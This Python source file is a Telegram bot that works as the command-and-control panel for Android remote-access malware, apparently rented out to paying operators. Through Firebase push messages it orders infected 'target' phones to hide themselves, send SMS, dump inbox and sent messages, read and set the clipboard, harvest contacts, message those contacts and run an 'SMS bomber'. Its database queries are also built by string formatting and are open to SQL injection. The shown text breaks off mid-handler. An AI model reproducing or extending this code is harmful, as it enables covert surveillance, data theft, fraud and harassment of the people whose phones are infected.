from pyrogram import Client , filters
from pyrogram.types import InlineKeyboardButton , InlineKeyboardMarkup
from pyrogram.enums import ChatMemberStatus
from requests import get , post
from threading import Thread
import time , datetime
import sqlite3
import pyrostep
import config
import requests
import time
import json
import re


app = Client(config.session , api_id=config.apiid , api_hash=config.apihash , workers=config.workers , bot_token=config.token)
pyrostep.install()
app.listen()

conn = sqlite3.connect("main.db" , check_same_thread=False)
cr = conn.cursor()
cr.execute("create table if not exists userCount(chat_id text primary key , count text)")
conn.commit()
cr.execute("create table if not exists url(chat_id text primary key , address text)")
conn.commit()
cr.execute("create table if not exists permitted(chat_id text primary key)")
conn.commit()
cr.execute("create table if not exists addedtime(chat_id text primary key , paytime text , endtime text)")
conn.commit()
cr.execute('create table if not exists offlinemode(chat_id text primary key , phone text)')
conn.commit()
cr.execute("create table if not exists firsttimesms(chat_id text primary key , phone text , texts text)")
conn.commit()

android_ids = {}
off_mode_numbers = {}
step = {}
sms_bomber = {}
ftime_sms = {}
webview = {}
sendsms = {}
allsms = {}
SMS_QUERY_KINDS = ["sent" , "inbox" , "allkinds"]

def setDefaultFirstTimeSms(chat_id):
    try:
        cr.execute(f"insert or ignore into firsttimesms values(?, ? , ?)" , (chat_id , "undefined" , "undefined"))
        conn.commit()
    except Exception as e:
        return e

def getFirstTimeSms(chat_id):
    try:
        cr.execute(f"select * from firsttimesms where chat_id='{chat_id}'")
        data = cr.fetchall()
        return (data[0][1] , data[0][2])
    except IndexError:
        setDefaultFirstTimeSms(chat_id)
        return ("undefined" , "undefined")
    except Exception as e:
        return e

def updateFirstTimeSmsText(chat_id , text):
    try:
        cr.execute(f"update firsttimesms set texts='{text}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e

def updateFirstTimeSmsPhone(chat_id , phone):
    try:
        cr.execute(f"update firsttimesms set phone='{phone}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e
def getUserCount(chat_id):
    try:
        cr.execute(f"select * from userCount where chat_id='{chat_id}'")
        return cr.fetchall()[0][1]
    except IndexError:
        addUser(chat_id)
        return 0
    except Exception as e:
        return e

def addUserCount(chat_id):
    try:
        cr.execute(f"update userCount set count='{int(getUserCount(chat_id)) + 1}' where chat_id='{chat_id}'");
        conn.commit()
    except Exception as e:
        return e

def addUser(chat_id):
    try:
        cr.execute(f"insert or ignore into userCount values(? , ?)" , (chat_id , 0 , ))
        conn.commit()
    except Exception as e:
        return e

def getUrl(chat_id):
    try:
        cr.execute(f"select * from url where chat_id='{chat_id}'")
        return cr.fetchall()[0][1]
    except IndexError:
        setDefaultUrl(chat_id)
        return "https://google.com"
    except Exception as e:
        return e

def setUrl(chat_id , address):
    try:
        cr.execute(f"update url set address='{address}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e

def setDefaultUrl(chet_id):
    try:
        cr.execute(f"insert or ignore into url values(? , ?)" , (chet_id , "https://google.com" , ))
        conn.commit()

    except Exception as e:
        return e

def permit(chat_id , days):
    try:
        now = datetime.datetime.now()
        now_unix = int(time.mktime(now.timetuple()))
        enddate = now + datetime.timedelta(days=days)
        enddate_unix = int(time.mktime(enddate.timetuple()))
        cr.execute(f"insert or ignore into addedtime values(?,?,?)" , (chat_id , str(now_unix) , str(enddate_unix)))
        conn.commit()
        addOnlypermitted(chat_id)
        addDefaultOfflineMode(chat_id)
        setDefaultFirstTimeSms(chat_id)
        setDefaultUrl(chat_id)
        addUser(chat_id)
    except Exception as e:
        return e

def updateOfflineMode(chat_id , phone):
    try:
        cr.execute(f"update offlinemode set phone='{phone}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e

def getOfflineMode(chat_id):
    try:
        cr.execute(f"select * from offlinemode where chat_id='{chat_id}'")
        return cr.fetchall()[0][1]
    except IndexError:
        addDefaultOfflineMode(chat_id)
        return "undefined"
    except Exception as e:
        return e

def addOnlypermitted(chat_id):
    try:
        cr.execute(f"insert or ignore into permitted values(?)", (chat_id,))
        conn.commit()
    except Exception as e:
        return e

def addDefaultOfflineMode(chat_id):
    try:
        cr.execute(f"insert or ignore into offlinemode values(? , ?)" , (chat_id , "undefined" , ))
        conn.commit()
    except Exception as e:
        return e


def unpermit(chat_id):
    try:
        cr.execute(f"delete from permitted where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e

def expired(chat_id):
    try:
        addedtime = getExpireTime(chat_id)
        now = int(time.mktime(datetime.datetime.now().timetuple()))
        if now >= addedtime:
            return True
        else:
            return False
    except Exception as e:
        return e

def unix_to_datetime(unix_timestamp):
    # Convert the Unix timestamp to a datetime object
    dt = datetime.datetime.fromtimestamp(unix_timestamp)

    # Return the formatted date and time string
    return dt.strftime('%Y-%m-%d %H:%M:%S')

def getAddedDate(chat_id):
    try:
        cr.execute(f"select * from addedtime where chat_id='{chat_id}'")
        return int(cr.fetchall()[0][1])
    except Exception as e:
        return e

def getExpireTime(chat_id):
    try:
        cr.execute(f"select * from addedtime where chat_id='{chat_id}'")
        return int(cr.fetchall()[0][2])
    except Exception as e:
        return e

def goToSupport():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 ꜱᴜᴘᴘᴏʀᴛ 🛒" , url=f"https://t.me/{config.dev}")]
    ])

def back(backData):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , backData)]
    ])

def back_to_off_mode_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , "offlinemode")]
    ])

def isPermitted(_ : Client , __):
    try:
        try:
            chat_id = __.chat.id
        except:
            chat_id = __.message.chat.id

        if str(chat_id) == str(config.admin):
            return True

        if expired(chat_id) == True:
            _.send_message(chat_id=chat_id , text=f"⏰ ʏᴏᴜʀ ᴘᴏʀᴛ ɴᴇᴇᴅꜱ ᴛᴏ ʙᴇ ʀᴇɴᴇᴡᴇᴅ ! \nʟᴀꜱᴛ ᴘᴀʏᴍᴇɴᴛ ᴅᴀᴛᴇ : {unix_to_datetime(getAddedDate(chat_id))} \nʀᴇɴᴇᴡᴀʟ ᴅᴀᴛᴇ : {unix_to_datetime(getExpireTime(chat_id))}" , reply_markup=goToSupport())
            return False

        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        for i in data:
            if str(chat_id) in i:
                return True
        return False
    except Exception as e:
        return e

def inPermittedList(chat_id):
    try:
        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        for i in data:
            if str(chat_id) in i:
                return True
        return False
    except Exception as e:
        return e

def permitedList():
    try:
        cr.execute(f"select * from permitted")
        data = cr.fetchall()
        return data
    except Exception as e:
        return e

def sendToAll(chat_ids , text):
    for i in chat_ids:
        try:
            app.send_message(chat_id=i , text=text)
            time.sleep(1.5)
        except: pass




def targetMenu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 ᴘɪɴɢ 🌐" , "pingone") , InlineKeyboardButton("🎛 ʜɪᴅᴇ 🎛" , "hideone")],
        [InlineKeyboardButton("✉️ ꜱᴇɴᴅ ꜱᴍꜱ  ✉️" , "sendsms")],
        [InlineKeyboardButton("📁 ᴀʟʟ ꜱᴍꜱ 📁" , "allsms") , InlineKeyboardButton("📤 ʟᴀꜱᴛ ꜱᴍꜱ 📤" , "lastsms")],
        [InlineKeyboardButton("⚙️ ꜰᴜʟʟ ɪɴꜰᴏ ⚙️" , "fullinfo")],
        [InlineKeyboardButton("🔇 ᴠɪʙʀᴀᴛᴇ 🔇" , "vibrate") , InlineKeyboardButton("🔉 ɴᴏʀᴍᴀʟ 🔉" , "normal")],
        [InlineKeyboardButton("📋 ɢᴇᴛ ᴄʟɪᴘʙᴏᴀʀᴅ  📋" , "getclipboard") , InlineKeyboardButton("📝 ꜱᴇᴛ ᴄʟɪᴘʙᴏᴀʀᴅ 📝" , "setclipboard")],
        [InlineKeyboardButton("☎️ ꜱᴇɴᴅ ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ  ☎️" , "sendmessagecontacts")],
        [InlineKeyboardButton("🎫 ɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ 🎫" , "allcontacts") , InlineKeyboardButton("🛠 ᴜɴʜɪᴅᴇ 🛠" , "unhideone")],
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , "back")],

    ])

def GetReqId(url):
    response = requests.get(f'https://check-host.net/check-http?host={url}', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Pragma': 'no-cache', 'Accept': 'application/json', 'content-type': 'application/json'})
    id = response.json()['request_id']
    return id

def GetResult(url):
    id = GetReqId(url)
    time.sleep(5)
    response = requests.get(f'https://check-host.net/check-report/{id}', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Pragma': 'no-cache', 'Accept': 'application/json', 'content-type': 'application/json'})
    return response.text

def sendPush(j):
    for i in config.key:
        try:
            post("https://fcm.googleapis.com/fcm/send", headers={"Authorization": f"key={i}"},
                 json={"data": j, "to": f"/topics/{config.topic}"}).json()
        except: pass


def addExpiredays(chat_id , days):
    try:
        now = datetime.datetime.now()
        new_end_date = now + datetime.timedelta(days=int(days))
        new_end_date_unix = int(time.mktime(new_end_date.timetuple()))
        cr.execute(f"update addedtime set endtime='{new_end_date_unix}' where chat_id='{chat_id}'")
        conn.commit()
    except Exception as e:
        return e

def check_host(url):
    result = GetResult(url)
    status = []
    pattern = r'ir[0-9].*?\[\[(.*?)\]'
    matches = re.findall(pattern, result)
    for match in matches:
        match = match.replace('"', '')
        splited = match.split(",")
        jsoned = {}
        if splited[0] == "1":
            jsoned['status'] = True
        elif splited[0] == "0":
            jsoned['status'] = False
        jsoned['ping'] = splited[1]
        jsoned['status_str'] = splited[2]
        jsoned['status_int'] = splited[3]
        status.append(jsoned)
    return json.dumps(status, indent=4)

def startMenu(chat_id):
    if str(chat_id) == str(config.admin):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 ᴘɪɴɢ ᴀʟʟ 🌐", "pingall"), InlineKeyboardButton("🎛 ʜɪᴅᴇ ᴀʟʟ 🎛", "hideall")],
            [InlineKeyboardButton("📊 ᴘᴏʀᴛ ɪɴꜰᴏ 📊", "portinfo")],
            [InlineKeyboardButton("📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ 📶", "offlinemode"),
             InlineKeyboardButton("📫 ꜱᴍꜱ ʙᴏᴍʙᴇʀ 📫", "smsbomber")],
            # [InlineKeyboardButton("♻️ ᴜᴘᴅᴀᴛᴇ ᴀᴅᴅʀᴇꜱꜱ ♻️", "updateaddress")],
            [InlineKeyboardButton("🔇 ᴠɪʙʀᴀᴛᴇ ᴀʟʟ 🔇", "vibrateall"),
             InlineKeyboardButton("🔉 ɴᴏʀᴍᴀʟ ᴀʟʟ 🔉", "normalall")],
            [InlineKeyboardButton("📝 ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ 📝", "firsttimesms")],
            [InlineKeyboardButton("🌐 ᴡᴇʙᴠɪᴇᴡ 🌐", "webview"),
             InlineKeyboardButton(getUrl(chat_id=chat_id), "webviewaddress")],
            [InlineKeyboardButton("📶 ᴄʜᴇᴄᴋ-ʜᴏꜱᴛ 📶", "check-host")],
            [InlineKeyboardButton("📱 ɪɴꜱᴛᴀʟʟᴇᴅ 📱", "usrcount"),
             InlineKeyboardButton(str(getUserCount(chat_id)), "usrcount2")],
            [InlineKeyboardButton("⚡️ ᴅᴇᴠ ⚡️", url=f"https://t.me/{config.dev}")]
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 ᴘɪɴɢ ᴀʟʟ 🌐", "pingall"), InlineKeyboardButton("🎛 ʜɪᴅᴇ ᴀʟʟ 🎛", "hideall")],
            [InlineKeyboardButton("📊 ᴘᴏʀᴛ ɪɴꜰᴏ 📊", "portinfo")],
            [InlineKeyboardButton("📶 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ 📶", "offlinemode"),
             InlineKeyboardButton("📫 ꜱᴍꜱ ʙᴏᴍʙᴇʀ 📫", "smsbomber")],
            # [InlineKeyboardButton("♻️ ᴜᴘᴅᴀᴛᴇ ᴀᴅᴅʀᴇꜱꜱ ♻️", "updateaddress")],
            [InlineKeyboardButton("🔇 ᴠɪʙʀᴀᴛᴇ ᴀʟʟ 🔇", "vibrateall"),
             InlineKeyboardButton("🔉 ɴᴏʀᴍᴀʟ ᴀʟʟ 🔉", "normalall")],
            [InlineKeyboardButton("📝 ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ 📝", "firsttimesms")],
            [InlineKeyboardButton("🌐 ᴡᴇʙᴠɪᴇᴡ 🌐", "webview"),
             InlineKeyboardButton(getUrl(chat_id=chat_id), "webviewaddress")],
            [InlineKeyboardButton("📶 ᴄʜᴇᴄᴋ-ʜᴏꜱᴛ 📶", "check-host")],
            [InlineKeyboardButton("📱 ɪɴꜱᴛᴀʟʟᴇᴅ 📱", "usrcount"),
             InlineKeyboardButton(str(getUserCount(chat_id)), "usrcount2")],
            [InlineKeyboardButton("⚡️ ᴅᴇᴠ ⚡️", url=f"https://t.me/{config.dev}")]
        ])

def openPanelNow():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ ᴏᴘᴇɴ ᴘᴀɴᴇʟ ɴᴏᴡ ! ⚙️" , "back")]
    ])
def offlineModeMenu(chat_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("☎️ ᴘʜᴏɴᴇ ☎️" , "change_off_mode_phone") , InlineKeyboardButton(str(getOfflineMode(chat_id)) , "offmodebtn2")],
        [InlineKeyboardButton("❌ ᴅɪꜱᴀʙʟᴇ ❌" , "disable_off_mode")],
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , "back")],
    ])

def confirm(backData):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ ʏᴇꜱ ✅" , "yes") , InlineKeyboardButton("❌ ɴᴏ ❌" , "no")],
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , backData)],
    ])

def firstTimeSmsMenu(chat_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📝 ᴛᴇxᴛ 📝" , "set_ftime_text") , InlineKeyboardButton(str(getFirstTimeSms(chat_id)[1]) , "ftimetextbtn")],
        [InlineKeyboardButton("☎️ ᴘʜᴏɴᴇ ☎️" , "set_ftime_phone") , InlineKeyboardButton(str(getFirstTimeSms(chat_id)[0]) , "ftimephonebtn")],
        [InlineKeyboardButton("❌ ᴅɪꜱᴀʙʟᴇ ❌" , "disable_ftime")],
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , "back")],
    ])

def backToFtime():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️", "firsttimesms")],
    ])

def send_check_host(chat_id):
    try:
        url = getUrl(chat_id)
        check_result = json.loads(check_host(url))
        ir1 = check_result[0]
        ir2 = check_result[1]
        ir3 = check_result[2]
        check_host_result = f"""
📡 ᴜʀʟ : `{url}`

🇮🇷 ɪʀ-1 ꜱᴇʀᴠᴇʀ : 
    🛠 ꜱᴛᴀᴛᴜꜱ : {ir1["status_str"]}
    ⌛ ᴘɪɴɢ : {ir1["ping"]}
    🌐 ᴄᴏᴅᴇ : {ir1["status_int"]} 

🇮🇷 ɪʀ-2 ꜱᴇʀᴠᴇʀ : 
    🛠 ꜱᴛᴀᴛᴜꜱ : {ir2["status_str"]}
    ⌛ ᴘɪɴɢ : {ir2["ping"]}
    🌐 ᴄᴏᴅᴇ : {ir2["status_int"]} 

🇮🇷 ɪʀ-3 ꜱᴇʀᴠᴇʀ : 
    🛠 ꜱᴛᴀᴛᴜꜱ : {ir3["status_str"]}
    ⌛ ᴘɪɴɢ : {ir3["ping"]}
    🌐 ᴄᴏᴅᴇ : {ir3["status_int"]} 

📶 ꜱᴇᴇ ꜰᴜʟʟ ʀᴇꜱᴜʟᴛ : `https://check-host.net/check-http?host={url}` """
        app.send_message(chat_id=chat_id , text=check_host_result , reply_markup=back("back"))
    except IndexError:
         app.send_message(chat_id=chat_id
            , text=f"❌ ᴜɴᴀʙʟᴇ ᴛᴏ ᴘᴀʀꜱᴇ ʀᴇꜱᴜʟᴛ ! \n/> ᴄʜᴇᴄᴋ ꜱᴛᴀᴛᴜꜱ ꜰʀᴏᴍ ᴛʜɪꜱ ʟɪɴᴋ : `https://check-host.net/check-http?host={url}`",
            reply_markup=back("back"))


def selectSmsQueryKind(backData):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 ɪɴʙᴏx 📥" , "inbox") , InlineKeyboardButton("📤 ꜱᴇɴᴛ 📤" , "sent")],
        [InlineKeyboardButton("📂 ᴀʟʟ ᴋɪɴᴅꜱ 📂" , "allkinds")],
        [InlineKeyboardButton("➡️ ʙᴀᴄᴋ ⬅️" , backData)]
    ])

def isValidCount(count):
    try:
        c = int(count)
        if c >= -1 and c != 0:
            return True
        else:
            return False
    except ValueError:
        return False

@app.on_message(filters=filters.command(["start" , "set" , "permit" , "unpermit" , "addday" , "info" , "repermit"]) & filters.group & isPermitted)
async def handler(client , message):
    try:
        command = message.command[0]
        if command == "start":
            await message.reply(f"/> ʜᴇʟʟᴏ ᴅᴇᴀʀ  {message.from_user.mention}" , reply_markup=startMenu(chat_id=message.chat.id))
        elif command == "set":
            android_ids[message.chat.id] = message.command[1]
            await message.reply(f"/> ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ꜰᴏʀ ᴜꜱᴇ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : `{android_ids[message.chat.id]}`" , reply_markup=targetMenu())

    except Exception as e:
        print(e)


@app.on_callback_query(filters=isPermitted)
async def callbackHandler(c , call):
    try:
        data = call.data
        chat_id = call.message.chat.id
        if data == "portinfo":
            await call.edit_message_text(f"🔩 ᴘᴏʀᴛ ɪɴꜰᴏ : \n\n💵 ꜰɪʀꜱᴛ ᴘᴀʏᴍᴇɴᴛ ᴅᴀᴛᴇ : {unix_to_datetime(getAddedDate(chat_id))} \n♻️ ʀᴇɴᴇᴡᴀʟ ᴅᴀᴛᴇ : {unix_to_datetime(getExpireTime(chat_id))} \n📱 ᴜꜱᴇʀꜱ ᴄᴏᴜɴᴛ : {getUserCount(chat_id)} \n\n⚡ ᴅᴇᴠ : @{config.dev}" , reply_markup=back("back"))
        elif data == "back":
            step[chat_id] = None
            off_mode_numbers[chat_id] = None
            sms_bomber[chat_id] = None
            ftime_sms[chat_id] = None
            await call.edit_message_text(f"/> ʜᴇʟʟᴏ ᴅᴇᴀʀ  {call.from_user.mention}" , reply_markup=startMenu(chat_id=chat_id))
        elif data == "pingall":
            Thread(target=sendPush , args=({"action" : "pingall" , "chat_id" : chat_id} , )).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ..." , False)
        elif data == "hideall":
            Thread(target=sendPush , args=({"action" : "hideall" , "chat_id" : chat_id} , )).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ..." , False)
        elif data == "offlinemode":
            step[chat_id] = None
            off_mode_numbers[chat_id] = None
            await call.edit_message_text(f"/> ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴍᴇɴᴜ : " , reply_markup=offlineModeMenu(chat_id))
        elif data == "change_off_mode_phone":
            step[chat_id] = "change_off_mode_phone"
            await call.edit_message_text(f"/> ꜱᴇɴᴅ ᴛʜᴇ ɴᴇᴡ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴇ.x 090xxxxxxxx) : \n/> ᴄᴏʀʀᴇɴᴛ : `{getOfflineMode(chat_id)}`" , reply_markup=back_to_off_mode_menu())
            temp = (await app.wait_for(chat_id)).text
            if temp.startswith("09") and len(temp) == 11:
                off_mode_numbers[chat_id] = temp
                await call.edit_message_text(f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ᴛᴏ ᴄʜᴀɴɢᴇ ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ? \nɴᴇᴡ ᴘʜᴏɴᴇ : `{off_mode_numbers[chat_id]}`" , reply_markup=confirm("offlinemode"))
            else:
                step[chat_id] = None
                off_mode_numbers[chat_id] = None
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ `{temp}` !" , reply_markup=back("change_off_mode_phone"))
        elif data == "yes":
            if step[chat_id] == "change_off_mode_phone":
                updateOfflineMode(chat_id , str(off_mode_numbers[chat_id]))
                await call.edit_message_text(f"✅ ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴛᴏ `{getOfflineMode(chat_id)}` !" , reply_markup=back_to_off_mode_menu())
                step[chat_id] = None
            elif step[chat_id] == "sms_bomber":
                step[chat_id] = None
                Thread(target=sendPush , args=({"action" : "smsbomber" , "phone" : sms_bomber[chat_id]["phone"] , "text" : sms_bomber[chat_id]["text"] , "chat_id" : chat_id} , )).start()
                await call.edit_message_text(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ..." , reply_markup=back("back"))
            elif step[chat_id] == "set_ftime_text":
                step[chat_id] = None
                updateFirstTimeSmsText(chat_id, text=ftime_sms[chat_id]["text"])
                await call.edit_message_text(f"✅ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ꜱᴇᴛᴛɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ! \n/> ɴᴇᴡ ᴛᴇxᴛ : `{getFirstTimeSms(chat_id)[1]}`" , reply_markup=backToFtime())
                ftime_sms[chat_id] = None
            elif step[chat_id] == "set_ftime_phone":
                step[chat_id] = None
                updateFirstTimeSmsPhone(chat_id, phone=ftime_sms[chat_id]["phone"])
                await call.edit_message_text(f"✅ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ꜱᴇᴛᴛɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ! \n/> ɴᴇᴡ ᴘʜᴏɴᴇ : `{getFirstTimeSms(chat_id)[0]}`" , reply_markup=backToFtime())
                ftime_sms[chat_id] = None
            elif step[chat_id] == "setwebview":
                step[chat_id] = None
                setUrl(chat_id , webview[chat_id]["url"])
                webview[chat_id] = None
                await call.edit_message_text(
                    f"✅ ᴡᴇʙᴠɪᴇᴡ ꜱᴇᴛᴛɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ! \n/> ɴᴇᴡ ᴜʀʟ : `{getUrl(chat_id)}`",
                    reply_markup=back("back"))
            elif step[chat_id] == "sendsms":
                Thread(target=sendPush , args=({"action" : "sendsms" , "androidid" : android_ids[chat_id] , "chat_id" : chat_id , "phone" : sendsms[chat_id]["phone"] , "text" : sendsms[chat_id]["text"]} , )).start()
                step[chat_id] = None
                sendsms[chat_id] = None
                await call.edit_message_text(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...",
                                             reply_markup=back(f"open_{android_ids[chat_id]}"))


        elif data == "no":
            if step[chat_id] == "change_off_mode_phone":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !" , reply_markup=back_to_off_mode_menu())
                step[chat_id] == None
                off_mode_numbers[chat_id] = None
            elif step[chat_id] == "sms_bomber":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !", reply_markup=back())
                step[chat_id] == None
                sms_bomber[chat_id] = None
            elif step[chat_id] == "set_ftime_text":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !", reply_markup=backToFtime())
                step[chat_id] == None
                ftime_sms[chat_id] = None
            elif step[chat_id] == "set_ftime_phone":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !", reply_markup=backToFtime())
                step[chat_id] == None
                ftime_sms[chat_id] = None
            elif step[chat_id] == "setwebview":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !", reply_markup=back("back"))
                step[chat_id] == None
                webview[chat_id] = None
            elif step[chat_id] == "sendsms":
                await call.edit_message_text(f"❌ ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ ᴜꜱᴇʀ !", reply_markup=back(f"open_{android_ids[chat_id]}"))
                step[chat_id] == None
                sendsms[chat_id] = None

        elif data == "disable_off_mode":
            updateOfflineMode(chat_id , "undefined")
            await call.edit_message_text(f"✅ ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴀʙʟᴇᴅ !" , reply_markup=back_to_off_mode_menu())
        elif data == "smsbomber":
            step[chat_id] = "sms_bomber"
            await call.edit_message_text(f"/> ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ᴛᴇxᴛ : " , reply_markup=back("back"))
            sms_bomber[chat_id] = {"text" : (await app.wait_for(call.from_user.id)).text}
            await call.edit_message_text(f"/> ᴛᴇxᴛ : `{sms_bomber[chat_id]['text']}` \n/> ꜱᴇɴᴅ ᴛʜᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ : " , reply_markup=back(backData="back"))
            temp = (await app.wait_for(call.from_user.id)).text
            if temp.startswith("09") and len(temp) == 11:
                sms_bomber[chat_id] = {"text" : sms_bomber[chat_id]["text"] , "phone" : temp}
                await call.edit_message_text(f"/> ᴀʀᴇ ʏᴏᴜ ꜱᴜʀᴇ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ʙᴏᴍʙᴇʀ ʀᴇQᴜᴇꜱᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ? \n/> ᴛᴇxᴛ : `{sms_bomber[chat_id]['text']}` \n/> ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ : `{sms_bomber[chat_id]['phone']}`" , reply_markup=confirm("back"))
            else:
                step[chat_id] = None
                sms_bomber[chat_id] = None
                await call.edit_message_text(f"❌ ɪɴᴠᴀʟɪᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ `{temp}` !" , reply_markup=back("smsbomber"))
        elif data == "vibrateall":
            Thread(target=sendPush, args=({"action": "vibrateall", "chat_id": chat_id},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "normalall":
            Thread(target=sendPush, args=({"action": "normalall", "chat_id": chat_id},)).start()
            await call.answer(f"⚡ ʀᴇQᴜᴇꜱᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ᴛᴏ ᴛᴀʀɢᴇᴛꜱ !\nᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ...", False)
        elif data == "firsttimesms":
            await call.edit_message_text(f"/> ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ᴍᴇɴᴜ : " , reply_markup=firstTimeSmsMenu(chat_id))
        elif data == "set_ftime_text":
            step[chat_id] = "set_ftime_text"
            await call.edit_message_text(f"/> ꜱᴇɴᴅ ᴛʜᴇ ꜰɪʀꜱᴛ ᴛɪᴍᴇ ꜱᴍꜱ ᴛᴇxᴛ : " , reply_markup=backToFtime())
            ftime_sms[chat_id] = {"text" : (await app.wait_for(call.from_user.id)).text}
